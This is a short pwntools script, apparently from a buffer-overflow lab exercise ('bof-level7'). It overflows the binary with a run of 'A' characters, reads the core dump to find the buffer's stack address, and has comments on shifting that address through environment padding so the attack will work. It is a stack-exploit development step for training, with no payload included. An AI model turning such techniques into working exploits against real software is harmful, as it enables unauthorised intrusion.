#!/usr/bin/env python


from pwn import *

#env = {
 #               'ENVENVENV' : 'a',  # change this number to control your stack...
 #               }                               # i.e., if your buffer is at 0x7fffffff??80,
                                # your attack will never work. change that 200
                                                                # to other value will change 0x7fffffff??80 to
                                                                                                # e.g., 0x7fffffff??60 or other lower values,
                                                                                                                                # then your attack might work..


#p = process('./bof-level7', env=env)
p = process('./bof-level7')
buf = "A" * 0x80 + "\x00"

p.sendline(buf)

c = Core('./core')

# example: 0x7fffffffebf0 was the buffer address
print(hex(c.stack.find(buf)))

